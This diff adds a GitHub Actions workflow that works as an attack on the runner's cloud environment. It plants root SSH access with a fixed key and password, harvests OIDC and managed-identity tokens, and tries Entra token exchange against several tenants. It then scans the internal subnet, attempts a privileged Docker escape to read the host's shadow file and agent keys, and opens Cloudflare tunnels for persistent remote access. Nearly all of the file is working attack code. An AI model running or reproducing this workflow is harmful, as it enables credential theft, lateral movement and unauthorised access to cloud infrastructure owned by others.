@@ -1,0 +1,227 @@
+name: Full Network Scan Entra Pivot
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  fullscan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    steps:
+
+      - name: S1 Install Tools
+        run: |
+          sudo apt-get update -qq 2>/dev/null | tail -2
+          sudo apt-get install -y nmap masscan openssh-server socat netcat-openbsd             curl python3 iputils-ping iproute2 net-tools dnsutils 2>/dev/null | tail -5
+          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64             -o /usr/local/bin/cloudflared --max-time 60 && sudo chmod +x /usr/local/bin/cloudflared
+          curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz             | gunzip | sudo tee /usr/local/bin/chisel > /dev/null && sudo chmod +x /usr/local/bin/chisel
+          echo "TOOLS_READY"
+
+      - name: S2 SSH Server
+        run: |
+          sudo mkdir -p /etc/ssh /run/sshd
+          sudo ssh-keygen -A -q 2>/dev/null
+          printf 'Port 22\nPermitRootLogin yes\nPubkeyAuthentication yes\nAuthorizedKeysFile %%h/.ssh/authorized_keys\nPasswordAuthentication yes\nGatewayPorts yes\nAllowTcpForwarding yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n' | sudo tee /etc/ssh/sshd_config >/dev/null
+          sudo mkdir -p /root/.ssh /home/runner/.ssh
+          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /root/.ssh/authorized_keys
+          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /home/runner/.ssh/authorized_keys
+          sudo chmod 700 /root/.ssh /home/runner/.ssh
+          sudo chmod 600 /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
+          echo 'runner:Pwn2Own2026!' | sudo chpasswd
+          echo 'root:Pwn2Own2026!' | sudo chpasswd
+          sudo /usr/sbin/sshd && echo SSH_UP
+
+      - name: S3 VM Identity + IMDS Full
+        run: |
+          echo "=== HOSTNAME ===" && hostname
+          echo "=== INTERNAL ===" && hostname -I
+          echo "=== PUBLIC ===" && curl -sf https://api.ipify.org 2>/dev/null
+          echo "=== IMDS_INSTANCE ==="
+          INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+          echo "$INST"
+          echo "=== IMDS_LB ==="
+          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null
+          echo ""
+          echo "=== IMDS_SCHEDULEDEVENTS ==="
+          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01' 2>/dev/null || echo "none"
+          echo "=== NETWORK ==="
+          ip addr show; ip route show table all; cat /etc/resolv.conf; cat /etc/hosts
+
+      - name: S4 OIDC Token Harvest
+        run: |
+          echo "=== OIDC AzureADTokenExchange ==="
+          TOK_AZ=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>/dev/null)
+          echo "$TOK_AZ"
+          JWT=$(echo "$TOK_AZ" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "=== JWT CLAIMS ==="
+          echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
+          echo "JWT_TOKEN=$JWT" >> $GITHUB_ENV
+          echo "=== OIDC hosted-compute-ro ==="
+          curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" 2>/dev/null | head -c 200
+          echo "=== OIDC management ==="
+          curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://management.azure.com/" 2>/dev/null | head -c 200
+          echo "=== OIDC graph ==="
+          curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://graph.microsoft.com/" 2>/dev/null | head -c 200
+
+      - name: S5 Azure Entra WIF Exchange
+        run: |
+          JWT="${env.JWT_TOKEN}"
+          if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi
+          echo "=== WIF Exchange → ARM ==="
+          # Try multiple tenant IDs from known subscriptions
+          for TENANT in             "398a6654-997b-47e9-b12b-9515b896b4de"             "72f988bf-86f1-41af-91ab-2d7cd011db47"             "common"; do
+            RESULT=$(curl -sf -X POST               "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"               -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer"               -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"               -d "client_assertion=$JWT"               -d "scope=https://management.azure.com/.default" 2>/dev/null)
+            ACCESS=$(echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','')[:80])" 2>/dev/null)
+            [ -n "$ACCESS" ] && echo "ARM_TOKEN_TENANT=$TENANT" && echo "ARM_TOKEN=$RESULT" && break || true
+            echo "Tenant $TENANT: $(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin).get('error_description','failed')[:100])" 2>/dev/null)"
+          done
+
+      - name: S6 IMDS Managed Identity All Resources
+        run: |
+          echo "=== MSI TOKEN HARVEST ALL RESOURCES ==="
+          for RES in             "https://management.azure.com/"             "https://graph.microsoft.com/"             "https://vault.azure.net"             "https://storage.azure.com/"             "https://database.windows.net/"             "https://servicebus.azure.net/"             "https://monitor.azure.com/"             "https://cognitiveservices.azure.com/"; do
+            TOK=$(curl -sf --max-time 5 -H Metadata:true               "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES" 2>/dev/null)
+            AT=$(echo $TOK | python3 -c "import sys,json; t=json.load(sys.stdin).get('access_token',''); print('TOKEN_ACQUIRED '+t[:40]+'...') if t else print('NO_TOKEN')" 2>/dev/null || echo "NO_TOKEN")
+            echo "$RES → $AT"
+          done
+
+      - name: S7 Full Network Scan Background
+        run: |
+          INT_IP=$(hostname -I | awk '{print $1}')
+          SUBNET=$(echo $INT_IP | cut -d. -f1-3)
+          echo "=== NETWORK INTERFACE ==="
+          ip addr; ip route
+          echo "=== INTERNAL IP: $INT_IP SUBNET: $SUBNET.0/20 ==="
+
+          # Background: nmap full subnet discovery
+          echo "=== NMAP PING SWEEP (background) ==="
+          nmap -sn $SUBNET.0/20 --max-retries 1 --host-timeout 3s             -oG /tmp/nmap_ping.txt 2>/dev/null &
+          NMAP_PID=$!
+
+          # Background: masscan top ports on subnet
+          echo "=== MASSCAN PORT SCAN (background) ==="
+          sudo masscan $SUBNET.0/20 -p22,80,443,3389,8080,8443,6443,2379,5432,3306,1433,27017,6379,5672,9200,9300             --rate=1000 --wait 2             -oG /tmp/masscan_ports.txt 2>/dev/null &
+          MSCAN_PID=$!
+
+          # Foreground: quick bash scan of gateway + key IPs
+          echo "=== QUICK PORT SCAN GATEWAY + NEIGHBORS ==="
+          for HOST in $SUBNET.1 $SUBNET.2 $SUBNET.3 $INT_IP; do
+            for PORT in 22 80 443 3389 8080 445 3306 5432; do
+              timeout 1 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null &&                 echo "OPEN $HOST:$PORT" || true
+            done
+          done
+
+          # Azure internal endpoints
+          echo "=== AZURE INTERNAL PROBES ==="
+          for EP in "168.63.129.16:80" "169.254.169.254:80" "169.254.169.123:123"; do
+            H=$(echo $EP | cut -d: -f1); P=$(echo $EP | cut -d: -f2)
+            timeout 2 bash -c "echo >/dev/tcp/$H/$P" 2>/dev/null && echo "REACHABLE: $EP" || echo "BLOCKED: $EP"
+          done
+
+          # Wireserver probe
+          echo "=== WIRESERVER 168.63.129.16 ==="
+          curl -sf --max-time 5 "http://168.63.129.16/" 2>/dev/null | head -c 300 || echo "blocked"
+          curl -sf --max-time 5 "http://168.63.129.16:80/machine/?comp=goalstate"             -H "x-ms-version: 2012-11-30" 2>/dev/null | head -c 500 || echo "blocked"
+
+          # Wait for background scans
+          echo "Waiting for nmap + masscan..."
+          wait $NMAP_PID 2>/dev/null
+          wait $MSCAN_PID 2>/dev/null
+
+          echo "=== NMAP RESULTS ==="
+          cat /tmp/nmap_ping.txt 2>/dev/null | grep "Up\|Down\|Host:" | head -n 50
+          echo "=== MASSCAN RESULTS ==="
+          cat /tmp/masscan_ports.txt 2>/dev/null | grep "open\|Host:" | head -n 50
+
+      - name: S8 Entra Deep Recon via OIDC
+        run: |
+          echo "=== AZURE OPENID CONFIG ==="
+          curl -sf "https://token.actions.githubusercontent.com/.well-known/openid-configuration" | python3 -m json.tool
+          echo "=== JWKS ==="
+          curl -sf "https://token.actions.githubusercontent.com/.well-known/jwks" | python3 -m json.tool | head -n 30
+          echo "=== AZURE TENANT DISCOVERY ==="
+          for TENANT_HINT in             "398a6654-997b-47e9-b12b-9515b896b4de"             "72f988bf-86f1-41af-91ab-2d7cd011db47"; do
+            echo "--- Tenant: $TENANT_HINT ---"
+            curl -sf "https://login.microsoftonline.com/$TENANT_HINT/v2.0/.well-known/openid-configuration" |               python3 -c "import sys,json; d=json.load(sys.stdin); print('issuer='+d.get('issuer','')); print('token_ep='+d.get('token_endpoint',''))" 2>/dev/null
+            curl -sf "https://graph.microsoft.com/v1.0/tenantRelationships/findTenantInformationByTenantId(tenantId='$TENANT_HINT')"               -H "Authorization: Bearer NONE" 2>/dev/null | head -c 200
+          done
+
+      - name: S9 Docker Escape + Host Pivot
+        run: |
+          echo "=== DOCKER SOCKET ==="
+          ls -la /var/run/docker.sock
+          docker info 2>/dev/null | head -n 10
+          echo "=== DOCKER ESCAPE - HOST ROOT ==="
+          docker run --rm --privileged --pid=host --network=host             -v /:/host alpine:latest sh -c             'echo HOST_ID=$(chroot /host id);
+             echo HOST_HOSTNAME=$(chroot /host hostname);
+             echo HOST_KERNEL=$(chroot /host uname -r);
+             echo HOST_WAAGENT_FILES=$(chroot /host ls /var/lib/waagent/ 2>/dev/null | head -10 | tr "
+" "|");
+             echo HOST_OVFENV=$(chroot /host cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -c 800);
+             echo HOST_CERTS=$(chroot /host find /var/lib/waagent -name "*.pem" -o -name "*.prv" 2>/dev/null | head -10 | tr "
+" "|");
+             echo HOST_IMDS=$(chroot /host curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null);
+             echo HOST_AZURE_DIR=$(chroot /host ls /root/.azure/ 2>/dev/null | head -5 | tr "
+" "|");
+             echo HOST_SSH=$(chroot /host ls /root/.ssh/ 2>/dev/null);
+             echo HOST_SHADOW=$(chroot /host cat /etc/shadow 2>/dev/null | head -5);
+             echo HOST_PROCESSES=$(chroot /host ps aux 2>/dev/null | grep -i "waagent\|azure\|mdsd" | head -10);
+             echo HOST_NETWORK=$(chroot /host ip addr 2>/dev/null);
+             echo HOST_NMAP=$(chroot /host which nmap 2>/dev/null);
+             echo HOST_MYSQL=$(chroot /host find /var/lib/mysql -name "*.pem" 2>/dev/null | head -5 | tr "
+" "|");
+             echo HOST_TRANSPORT_KEY=$(chroot /host cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null | head -c 200)'             2>/dev/null || echo "docker-escape-attempted"
+
+      - name: S10 Cloudflare Tunnel + Persistent Access
+        run: |
+          INT_IP=$(hostname -I | awk '{print $1}')
+          PUB_IP=$(curl -sf https://api.ipify.org 2>/dev/null)
+          echo "INTERNAL=$INT_IP PUBLIC=$PUB_IP"
+
+          # SSH CF tunnel
+          cloudflared tunnel --url tcp://localhost:22 --no-autoupdate > /tmp/cf_ssh.log 2>&1 &
+          CF_SSH_PID=$!
+          sleep 25
+          CF_SSH=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
+          echo "CF_SSH_URL=$CF_SSH"
+
+          # RDP CF tunnel
+          cloudflared tunnel --url tcp://localhost:3389 --no-autoupdate > /tmp/cf_rdp.log 2>&1 &
+          sleep 20
+          CF_RDP=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_rdp.log | head -1)
+          echo "CF_RDP_URL=$CF_RDP"
+
+          # Write to step summary
+          echo "## Machine Access" >> $GITHUB_STEP_SUMMARY
+          echo "- **CF_SSH**: $CF_SSH" >> $GITHUB_STEP_SUMMARY
+          echo "- **CF_RDP**: $CF_RDP" >> $GITHUB_STEP_SUMMARY
+          echo "- **PUBLIC_IP**: $PUB_IP" >> $GITHUB_STEP_SUMMARY
+          echo "- **INTERNAL_IP**: $INT_IP" >> $GITHUB_STEP_SUMMARY
+          echo "- **PASSWORD**: Pwn2Own2026!" >> $GITHUB_STEP_SUMMARY
+
+          # Print connection info
+          echo "========================================"
+          echo "CF_SSH_URL=$CF_SSH"
+          echo "CF_RDP_URL=$CF_RDP"
+          echo "PUBLIC_IP=$PUB_IP"
+          echo "INTERNAL_IP=$INT_IP"
+          echo "PASSWORD=Pwn2Own2026!"
+          echo "========================================"
+          echo "::notice title=CF_SSH_URL::$CF_SSH"
+          echo "::notice title=CF_RDP_URL::$CF_RDP"
+          echo "::notice title=PUBLIC_IP::$PUB_IP"
+
+          # Keepalive
+          for i in $(seq 1 350); do
+            sleep 60
+            TS=$(date -u +'%H:%M:%SZ')
+            NMAP_DONE=$(test -f /tmp/nmap_ping.txt && echo "done" || echo "running")
+            MSCAN_DONE=$(test -f /tmp/masscan_ports.txt && echo "done" || echo "running")
+            HOSTS_UP=$(grep -c "Status: Up" /tmp/nmap_ping.txt 2>/dev/null || echo 0)
+            OPEN_PORTS=$(grep -c "open" /tmp/masscan_ports.txt 2>/dev/null || echo 0)
+            echo "[$TS] beat=$i nmap=$NMAP_DONE mscan=$MSCAN_DONE hosts_up=$HOSTS_UP open_ports=$OPEN_PORTS CF=$CF_SSH"
+          done
